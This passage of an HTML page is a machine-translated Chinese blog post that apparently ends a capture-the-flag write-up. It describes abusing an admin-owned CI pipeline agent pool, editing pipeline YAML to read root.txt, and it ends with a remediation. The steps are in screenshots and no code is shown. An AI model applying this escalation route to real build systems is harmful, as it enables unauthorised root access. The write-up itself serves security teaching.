translated">寻找其他方法来找到有管理员权限的东西，然后利用它来获得shell。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nt"><img src="../Images/2c82ec5f7e479e88fb15ba9ad6c2234b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rdF3-N9lCW6nr6Vx3lq3aA.png"/></div></div></figure><p id="33da" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated"><strong class="lr iu">错误配置问题</strong></p><p id="034b" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">在浏览这个站点后，我发现管道代理池是由管理员拥有的。我检查了这个<em class="oc">管道</em>特性是否可以被利用来获得根。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qc"><img src="../Images/04d214b9896471b81426069479569a53.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*H2_f6kC-tiAWn2WRjoUZuQ.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qd"><img src="../Images/930a2fc094e2ca9a221f4d0cd91da36f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*EgA0QrR6YrJ3_05DzhbIlg.gif"/></div></div></figure><p id="0463" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">对于“<em class="oc">检查您的管道YAML </em>”部分，我们稍微修改了这里的代码，以提取root.txt文件。</p><p id="2d68" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">如前面从<em class="oc">“项目设置”页面&gt;“代理池”</em>看到的，名称是<strong class="lr iu">“设置”</strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi qe"><img src="../Images/4644876c5dfc5754108f496d83204e3e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1008/format:webp/1*aDgJgB4fnW6kRPjS3KfLzg.png"/></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qf"><img src="../Images/eb53a311a7c334458712be5c0dd81da0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uOpAiwA25WoafKCOM7Ef6w.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qg"><img src="../Images/0076ac9ab0b75814b2519d8e5b01f989.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fRK5fJwa7QdvKEBCJQdKjg.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qh"><img src="../Images/736e2e6d36305e970075481edadf6721.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UQjleVg-D2IeczMdw8ETqA.png"/></div></div><figcaption class="og oh gj gh gi oi oj bd b be z dk translated"><strong class="bd kz">成功了！！！</strong></figcaption></figure></div><div class="ab cl kq kr hx ks" role="separator"><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv"/></div><div class="im in io ip iq"><h2 id="cc3f" class="pa ky it bd kz pb pc dn ld pd pe dp lh ly pf pg lj mc ph pi ll mg pj pk ln pl bi translated">补救</h2><ul class=""><li id="479f" class="mq mr it lr b ls lt lv lw ly pt mc pu mg pv mk mv mw mx my bi translated">配置管道功能设置，使非特权用户无法访问。</li></ul></div><div class="ab cl kq kr hx ks" role="separator"><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv"/></div><div class="im in io ip iq"><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qi"><img src="../Images/91bfff53ab077387ff8315e39a1af108.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*n-xHiig_lmm0j9gMBmHvTA.gif"/></div></div></figure></div></div>    
</body>
</html>